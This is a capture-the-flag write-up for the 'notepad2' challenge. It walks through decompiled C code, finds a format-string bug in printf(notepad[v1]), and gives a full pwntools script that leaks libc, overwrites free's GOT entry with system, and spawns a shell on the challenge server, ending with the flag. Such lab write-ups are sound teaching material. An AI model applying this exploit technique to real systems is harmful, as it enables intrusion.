The program gives us a binary and libc file, similar to the structure of notepad1 but without the heap related error here.
**createNote()** function:

```c
unsigned __int64 createNote()
{
  unsigned int v0; // ebx
  unsigned int v2; // [rsp+Ch] [rbp-B4h] BYREF
  char src[152]; // [rsp+10h] [rbp-B0h] BYREF
  unsigned __int64 v4; // [rsp+A8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  puts("Choose the index to store your note(0-9)");
  printf("> ");
  __isoc99_scanf("%d", &v2);
  if ( v2 > 9 )
  {
    printf("Wrong index!");
    exit(0);
  }
  if ( notepad[v2] )
  {
    printf("Note already exists!");
    exit(0);
  }
  v0 = v2;
  notepad[v0] = (char *)malloc(0x96uLL);
  if ( !notepad[v2] )
  {
    printf("[X] Something went wrong!, Try again!");
    exit(0);
  }
  puts("Add your note:");
  printf("> ");
  __isoc99_scanf("%149s", src);
  strcpy(notepad[v2], src);
  return v4 - __readfsqword(0x28u);
}
```

The function creates a chunk of size 0x160, and accepts data with a maximum length of 149 characters, so there is no overflow error here.
```removeNote()``` function:

```c
unsigned __int64 removeNote()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Choose the index of your note you want to remove");
  printf("> ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 9 )
  {
    printf("Wrong index!");
    exit(0);
  }
  if ( !notepad[v1] )
  {
    printf("Note is already empty!");
    exit(0);
  }
  free(notepad[v1]);
  notepad[v1] = 0LL;
  return v2 - __readfsqword(0x28u);
}
```

It also deletes the chunk pointer so there is no UAF error here either.
**viewNote()** function:

```c
unsigned __int64 viewNote()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Choose the index of your note you want to view");
  printf("> ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 9 )
  {
    printf("Wrong index!");
    exit(0);
  }
  if ( !notepad[v1] )
  {
    printf("Note is empty at the index %d", v1);
    exit(0);
  }
  printf(notepad[v1]);
  return v2 - __readfsqword(0x28u);
}
```

We have a string format error in **print(notepad[v1])**. So we just need to enter the string format into the notepad data, print it out, then we will leak the libc address and change it as we want. First, I leak the libc address:

![image](https://hackmd.io/_uploads/BJdcKM_fye.png)

Result: 

![image](https://hackmd.io/_uploads/r1k2FG_zke.png)

Check in gdb and see if it matches.
Next, I tried to override got of **printf** as [here](https://www.youtube.com/watch?v=ZosW20QjET8&list=PLEvZsp0uc3SFuVi6TtcahxqsEbV29lXAM&index=19) but got seg fault. So I tried again with overriding got of free. With this override, I will write 2 bytes 1, total need to write 6 bytes

![image](https://hackmd.io/_uploads/SJgQqGuzkl.png)

Finally, just create a chunk with data as **''/bin/sh'** and free it to get the shell.

Script: 
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./notepad2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("notepad2.ctf.intigriti.io", 1342)

    return r


def main():
    r = conn()
    def createNote(index, data):
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'> ', index)
        r.sendlineafter(b'> ', data)
    def viewNote(index):
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'> ', index)

    def deleteNote(index):
        r.sendlineafter(b'> ', b'3')
        r.sendlineafter(b'> ', index)
    input()
    # Leak dia chi libc
    createNote(b'0', b'%13$p')

    viewNote(b'0')

    libc_leak = int(r.recv(16), 16)
    libc.address = libc_leak - 0x28150
    info(b'Libc leak address: ' + hex(libc_leak).encode())
    info(b'Libc address: ' + hex(libc.address).encode())
    info(b'Libc system address: ' + hex(libc.sym['system']).encode())
    info(b'Libc got address: ' + hex(libc.sym['free']).encode())
    deleteNote(b'0')
    pause()
    # Leak canary
    # r.sendlineafter(b'> ', b'1')
    # r.sendlineafter(b'> ', b'1')
    # r.sendlineafter(b'> ', '%7$p')

    # r.sendlineafter(b'> ', b'2')
    # r.sendlineafter(b'> ', b'1')
    # canary_leak = int(r.recv(16), 16)
    # info(b'Canary leak: ' + hex(canary_leak).encode())
    # # Leak rbp address
    # r.sendlineafter(b'> ', b'1')
    # r.sendlineafter(b'> ', b'2')
    # r.sendlineafter(b'> ', '%8$p')

    # r.sendlineafter(b'> ', b'2')
    # r.sendlineafter(b'> ', b'2')
    # save_rbp = int(r.recv(16), 16)
    # info(b'Save_rbp: ' + hex(save_rbp).encode())

    # # Leak return main address
    # r.sendlineafter(b'> ', b'1')
    # r.sendlineafter(b'> ', b'3')
    # r.sendlineafter(b'> ', b'%9$p')

    # r.sendlineafter(b'> ', b'2')
    # r.sendlineafter(b'> ', b'3')
    # return_main = int(r.recv(7), 16)
    # info(b'Return main address: ' + hex(return_main).encode())

    # Overwrite GOT printf
    # exe.address = 0x00000000003fe000
    system_plt  = libc.sym['system']
    for i in range(3):
        createNote(str(i).encode(), f'%{exe.got.free + (i*2)}c%17$lln')
        viewNote(str(i).encode())
        createNote(str(9-i).encode(), f'%{system_plt &0xffff}c%47$hn')
        viewNote(str(9-i).encode())
        system_plt >>= 16
    
    createNote(b'6', b'/bin/sh\0')
    deleteNote(b'6')
    
    pause()
    
    # Trigger /bin/sh
    # r.sendlineafter(b'> ', b'1')
    # r.sendlineafter(b'> ', b'5')
    # r.sendlineafter(b'> ', b'/bin/sh')
    # pause()
    # r.sendlineafter(b'> ', b'2')
    # r.sendlineafter(b'> ', b'5')
    # pause()
    # good luck pwning :)
    
    r.interactive()


if __name__ == "__main__":
    main()


```
Result:

![image](https://hackmd.io/_uploads/Hk6D5G_fJx.png)

Flag: ```INTIGRITI{f0rm4t_0n_h34p_1s_fun}```
